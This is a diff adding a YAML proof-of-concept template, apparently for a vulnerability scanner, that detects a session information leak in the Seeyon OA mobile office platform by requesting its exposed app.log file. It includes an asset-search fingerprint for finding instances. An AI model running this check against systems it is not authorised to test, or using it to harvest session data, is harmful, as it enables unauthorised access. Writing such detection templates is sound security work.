@@ -1,0 +1,16 @@
+id: poc-yaml-seeyon-app-log-session-sensitive-info-leak
+info:
+  name: 致远OA移动智能办公平台 app.log Session敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远OA移动智能办公平台
+  hunter: web.icon=="657d4895205951cbea6396701b194c30"
+requests:
+- method: GET
+  path: /mobile_portal/logs/app.log
+  expression: "status_code == 200 && \ncontains(body,\"com.seeyon.portal\") &&\ncontains(body,\"\
+    java.lang.RuntimeException\") &&\ncontains(body,\"Failed to parse stringified\
+    \ userOverrides\") &&\ncontains(content_type,\"text/plain\")\n"
+variables: {}
+transport: http
